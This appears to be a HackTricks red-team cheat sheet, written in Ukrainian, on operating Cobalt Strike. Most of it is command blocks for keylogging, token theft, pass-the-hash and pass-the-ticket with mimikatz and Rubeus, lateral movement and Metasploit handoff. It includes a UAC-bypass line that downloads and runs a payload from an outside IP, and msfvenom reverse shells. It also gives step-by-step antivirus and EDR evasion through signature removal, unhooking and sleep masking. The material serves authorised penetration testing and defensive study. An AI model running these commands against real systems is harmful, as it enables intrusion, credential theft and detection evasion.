# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Слухачі

### C2-слухачі

`Cobalt Strike -> Listeners -> Add/Edit` — тут можна вибрати, де слухати, який тип beacon використовувати (http, dns, smb...) та інші параметри.

### Peer2Peer-слухачі

Beacon цих слухачів не потрібно безпосередньо підключатися до C2 — вони можуть зв’язуватися з ним через інші beacon.

`Cobalt Strike -> Listeners -> Add/Edit` — тут потрібно вибрати TCP- або SMB-beacon.

* **TCP-beacon відкриє слухач на вибраному порту**. Щоб підключитися до TCP-beacon, виконайте команду `connect <ip> <port>` з іншого beacon.
* **SMB-beacon слухатиме в каналі з вибраною назвою**. Щоб підключитися до SMB-beacon, потрібно виконати команду `link [target] [pipe]`.

### Створення та розміщення payloads

#### Створення payloads у файлах

`Attacks -> Packages ->`

* **`HTMLApplication`** для HTA-файлів
* **`MS Office Macro`** для документа Office з макросом
* **`Windows Executable`** для файлу .exe, .dll або сервісного .exe
* **`Windows Executable (S)`** для **stageless**-файлу .exe, .dll або сервісного .exe (stageless краще за staged — менше IoC)

#### Створення та розміщення payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` — це створить скрипт/виконуваний файл для завантаження beacon із Cobalt Strike у таких форматах, як bitsadmin, exe, powershell і python.

#### Розміщення payloads

Якщо у вас уже є файл, який потрібно розмістити на вебсервері, перейдіть до `Attacks -> Web Drive-by -> Host File`, виберіть файл для розміщення та налаштуйте вебсервер.

### Параметри Beacon

<details>
<summary>Параметри та команди Beacon</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Кастомні імпланти / Linux Beacons

- Кастомному агенту потрібно лише підтримувати HTTP/S-протокол Cobalt Strike Team Server (профіль malleable C2 за замовчуванням), щоб реєструватися/виконувати check-in і отримувати завдання. Реалізуйте ті самі URI/заголовки/криптографію метаданих, визначені в профілі, щоб повторно використовувати інтерфейс Cobalt Strike для постановки завдань і перегляду виводу.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (наприклад, `CustomBeacon.cna`) може обгорнути генерацію payload для Beacon, що не працює у Windows, щоб оператори могли вибрати listener і створювати ELF payload безпосередньо з GUI.
- Приклади обробників завдань Linux, доступних через Team Server: `sleep`, `cd`, `pwd`, `shell` (виконання довільних команд), `ls`, `upload`, `download` і `exit`. Вони відповідають ID завдань, які очікує Team Server, і мають бути реалізовані на сервері для повернення виводу у належному форматі.
- Підтримку BOF у Linux можна додати, завантажуючи Beacon Object Files у поточний процес за допомогою [ELFLoader від TrustedSec](https://github.com/trustedsec/ELFLoader) (також підтримує BOF у стилі Outflank). Це дає змогу виконувати модульний post-exploitation у контексті/з привілеями імпланта без створення нових процесів.<sup>[[2]](#references)[[3]](#references)</sup>
  Відомості про формати завантажувача Linux і обмеження меж процесів, а також окремий приклад постановки завдань BOF див. у статті [Linux BOF loader formats and process boundaries](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries).
- Вбудуйте обробник SOCKS у кастомний Beacon, щоб зберегти паритет із Windows Beacons у можливостях pivoting: коли оператор виконує `socks <port>`, імплант має відкрити локальний проксі для маршрутизації інструментів оператора через скомпрометований хост Linux у внутрішні мережі.

## Opsec

### Execute-Assembly

**`execute-assembly`** використовує **sacrificial process** і віддалене впровадження процесу для виконання зазначеної програми. Це дуже помітна операція, оскільки для впровадження в процес використовуються певні Win API, за якими стежить кожен EDR. Однак є спеціальні інструменти, за допомогою яких можна завантажити щось у той самий процес:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- У Cobalt Strike також можна використовувати BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor Script `https://github.com/outflanknl/HelpColor` створить у Cobalt Strike команду `helpx`, яка додаватиме кольори до команд, позначаючи BOF зеленим, Fork&Run — жовтим, а ProcessExecution, injection тощо — червоним. Це допомагає визначити, які команди є stealthier.

### Сучасний post-execution у поточному процесі

У новіших версіях додано дві альтернативи на випадок, коли класичний COFF BOF має надто багато обмежень:

- **Beacon Interpreter** компілює C на Team Server у проміжний bytecode і виконує його у VM, вбудованій у Beacon. Bytecode залишається даними, а не нативним виконуваним кодом, тому не потрібні додаткове виділення виконуваної пам’яті та перехід дозволів із RW на RX, які зазвичай необхідні для завантаження BOF. Скрипти можуть імпортувати Beacon API та оголошувати прототипи Dynamic Function Resolution (DFR) у стилі BOF.
- **BOF-PE** завантажує повний EXE або DLL у поточний Beacon. Цей формат підтримує звичайні PE imports, обробку винятків, складніший C++ і зовнішні бібліотеки, зберігаючи доступ до Beacon API. Він важчий за невеликий COFF BOF, тому використовуйте його лише тоді, коли додаткове середовище виконання справді потрібне.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Ці механізми зменшують сигнали, пов’язані із завантажувачем, але не телеметрію, що створюється діями скрипту або викликами Windows API.<sup>[[8]](#references)</sup>

### Дійте як користувач

Можна перевірити такі події, як `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 — перевірте всі інтерактивні входи в систему, щоб визначити звичайні робочі години.
- System EID 12,13 — перевірте частоту вимкнень, запусків і переходів у режим сну.
- Security EID 4624/4625 — перевірте вхідні успішні та невдалі спроби автентифікації NTLM.
- Security EID 4648 — ця подія створюється, коли для входу використовуються облікові дані у відкритому тексті. Якщо її згенерував процес, бінарний файл потенційно містить облікові дані у відкритому тексті в конфігураційному файлі або в коді.

Для запуску `jump` у Cobalt Strike краще використовувати метод `wmi_msbuild`, щоб новий процес виглядав легітимніше.

### Використовуйте облікові записи комп’ютерів

Захисники часто перевіряють підозрілу поведінку користувачів і **виключають службові облікові записи та облікові записи комп’ютерів, як-от `*$`, зі свого моніторингу**. Ці облікові записи можна використовувати для латерального переміщення або підвищення привілеїв.

### Використовуйте stageless payloads

Stageless payloads створюють менше шуму, ніж staged payloads, оскільки їм не потрібно завантажувати другий етап із C2-сервера. Це означає, що після початкового з’єднання вони не генерують мережевого трафіку, тому мережевим засобам захисту складніше їх виявити.

### Токени та Token Store

Будьте обережні під час викрадення або створення токенів, оскільки EDR може перераховувати токени потоків і виявити **токен іншого користувача** або навіть SYSTEM у процесі.

Це дає змогу зберігати токени **для кожного beacon**, тож не доведеться знову й знову викрадати той самий токен. Це корисно для латерального переміщення або коли потрібно кілька разів використати викрадений токен:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Під час латерального переміщення зазвичай краще **викрасти токен, ніж створювати новий** або виконувати атаку pass the hash.

### Guardrails

У Cobalt Strike є функція під назвою **Guardrails**, яка допомагає запобігти використанню певних команд або виконанню дій, які можуть виявити захисники. Guardrails можна налаштувати на блокування конкретних команд, як-от `make_token`, `jump`, `remote-exec` та інших, що часто використовуються для латерального переміщення або підвищення привілеїв.

Крім того, у репозиторії [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) також є перевірки та ідеї, які варто врахувати перед виконанням payload.

### Шифрування квитків

В AD звертайте увагу на шифрування квитків. За замовчуванням деякі інструменти використовують для квитків Kerberos шифрування RC4, яке менш безпечне за AES. У сучасних середовищах за замовчуванням використовується AES. Захисники, які відстежують слабкі алгоритми шифрування, можуть виявити таке використання.

### Уникайте значень за замовчуванням

За замовчуванням SMB pipes у Cobalt Strike мають назву `msagent_####` і `"status_####`. Змініть ці назви. Перевірити назви наявних pipes у Cobalt Strike можна командою: `ls \\.\pipe\`

Крім того, під час SSH-сеансів створюється pipe з назвою `\\.\pipe\postex_ssh_####`. Змініть її за допомогою `set ssh_pipename "<new_name>";`.

Також під час post-exploitation атаки можна змінити pipes `\\.\pipe\postex_####` за допомогою `set pipename "<new_name>"`.

У профілях Cobalt Strike також можна змінювати такі параметри:

- Не використовувати `rwx`
- Поведінку ін’єкції в процес (які API використовуватимуться) у блоці `process-inject {...}`
- Роботу механізму "fork and run" у блоці `post-ex {…}`
- Час очікування
- Максимальний розмір бінарних файлів, які завантажуються в пам’ять
- Обсяг пам’яті та вміст DLL за допомогою блоку `stage {...}`
- Мережевий трафік

### Sleepmask і BeaconGate

Sleepmask перетворює Beacon і відстежувані ним виділення heap-пам’яті, поки він неактивний, а потім відновлює їх для виконання завдань. Поточні випуски мають за замовчуванням evasive-налаштування, але власні Sleepmask BOF залишаються корисними, якщо відрізняються вимоги до структури пам’яті, виділення пам’яті або стека викликів. Починаючи з версії 4.13, Sleepmask за замовчуванням також підмінює адресу повернення для API, виклики яких проксіюються через BeaconGate.<sup>[[8]](#references)</sup>

**BeaconGate** розширює цю схему за межі `Sleep`: вибрані виклики WinAPI представляються як структури `FUNCTION_CALL` і передаються до Sleepmask BOF, який може маскувати Beacon під час виконання виклику. У профілі можна налаштувати проксіювання для групи (`Comms`, `Core`, `Cleanup` або `All`) чи лише для окремих API:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

Для API, зазначеного в `beacon_gate`, gate має пріоритет над `syscall_method`; API, яких у списку немає, усе одно можуть використовувати налаштований syscall method. Команди `beacon_gate disable` і `beacon_gate enable` вмикають і вимикають цю функцію під час роботи. Не вмикайте `All` бездумно: команди на кшталт `ps` багаторазово викликають `OpenProcess`/`CloseHandle`, що може спричинити стрибок навантаження на CPU, коли кожен виклик маскує та демаскує Beacon. Sleepmask-VS надає змодельований стан Beacon/Sleepmask для налагодження власних gates, щоб не доводилося постійно тестувати їх на активному implant.<sup>[[9]](#references)</sup>

### Шумні proc injections

Ін'єкція коду в процес зазвичай дуже помітна, адже **звичайні процеси зазвичай не виконують таку дію, а способів зробити це дуже мало**. Тому її можуть виявити системи виявлення на основі поведінки. Крім того, EDR можуть виявляти її, скануючи мережу на наявність **threads із кодом, якого немає на диску** (хоча такі процеси, як браузери, часто використовують JIT). Приклад: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | зв'язки PID і PPID

Під час запуску нового процесу важливо **зберігати звичайні зв'язки між батьківськими та дочірніми процесами**, щоб уникнути виявлення. Якщо svchost.exec запускає iexplorer.exe, це виглядатиме підозріло, адже у звичайному середовищі Windows svchost.exe не є батьківським процесом iexplorer.exe.

За замовчуванням, коли в Cobalt Strike запускається новий Beacon, створюється процес із **`rundll32.exe`**, щоб запустити новий listener. Це не дуже приховано, і EDR можуть легко це виявити. Крім того, `rundll32.exe` запускається без аргументів, що робить його ще підозрілішим.

За допомогою наведеної нижче команди Cobalt Strike можна вказати інший процес для запуску нового Beacon, знизивши ймовірність його виявлення:

```bash
spawnto x86 svchost.exe
```

Ви також можете змінити це налаштування **`spawnto_x86` і `spawnto_x64`** у профілі.

### Проксіювання трафіку атакувальника

Атакувальникам іноді потрібно запускати інструменти локально, навіть на Linux-машинах, і спрямовувати трафік жертв до інструмента (наприклад, для NTLM relay).

Крім того, під час атаки pass-the.hash або pass-the-ticket атакувальнику іноді вигідніше з погляду непомітності **додати цей hash або ticket до власного процесу LSASS** локально, а потім виконувати pivoting звідти, замість того щоб змінювати процес LSASS на машині жертви.

Однак потрібно **уважно стежити за трафіком, який генерується**, оскільки ваш backdoor-процес може надсилати незвичний трафік (Kerberos?). Для цього можна перейти до процесу браузера (хоча ін’єкція у процес може вас викрити, тож подумайте, як зробити це непомітно).


### Уникнення AV

#### Обхід AV/AMSI/ETW

Перегляньте сторінку:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Зазвичай у `/opt/cobaltstrike/artifact-kit` можна знайти код і попередньо скомпільовані шаблони (у `/src-common`) payloads, які Cobalt Strike використовуватиме для створення бінарних beacons.

За допомогою [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) зі згенерованим backdoor (або просто зі скомпільованим шаблоном) можна визначити, що саме запускає спрацювання Defender. Зазвичай це рядок. Тож можна просто змінити код, який генерує backdoor, щоб цей рядок не з’являвся у фінальному бінарному файлі.

Після зміни коду запустіть `./build.sh` у тому самому каталозі та скопіюйте папку `dist-pipe/` на Windows-клієнт у `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Не забудьте завантажити aggressive script `dist-pipe\artifact.cna`, щоб вказати Cobalt Strike використовувати потрібні нам ресурси з диска, а не завантажені.

#### Набір ресурсів

Папка ResourceKit містить шаблони скриптових payloads Cobalt Strike, зокрема PowerShell, VBA та HTA.

За допомогою [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) і шаблонів можна з’ясувати, що не подобається Defender (у цьому випадку AMSI), і змінити це:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Змінивши виявлені рядки, можна створити шаблон, який не буде виявлено.

Не забудьте завантажити aggressive-скрипт `ResourceKit\resources.cna`, щоб вказати Cobalt Strike використовувати потрібні нам ресурси з диска, а не завантажені.

#### Function hooks | Syscall

Перехоплення функцій — дуже поширений метод EDR для виявлення шкідливої активності. Cobalt Strike дає змогу обходити ці хуки, використовуючи **syscalls** замість стандартних викликів Windows API за допомогою конфігурації **`None`**, або використовувати версію функції `Nt*` із параметром **`Direct`**, або просто переходити через функцію `Nt*`, використовуючи параметр **`Indirect`** у malleable profile. Залежно від системи один варіант може бути stealthier за інший.

Це можна налаштувати в profile або за допомогою команди **`syscall-method`**

Однак це також може бути помітно.

Cobalt Strike також дає змогу обходити хуки функцій, видаляючи їх за допомогою: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Також можна перевірити, які функції перехоплюються, за допомогою [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) або [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Різні команди Cobalt Strike</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (PoC користувацького імпланта)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [ELFLoader і Linux BOFs від TrustedSec](https://github.com/trustedsec/ELFLoader)
- [3] [Шаблон nix BOF від Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Аналіз Unit42 шифрування метаданих Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Щоденник SANS ISC про трафік Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [CobaltStrikeParser від SentinelOne](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Загублені в перекладі](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Через BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
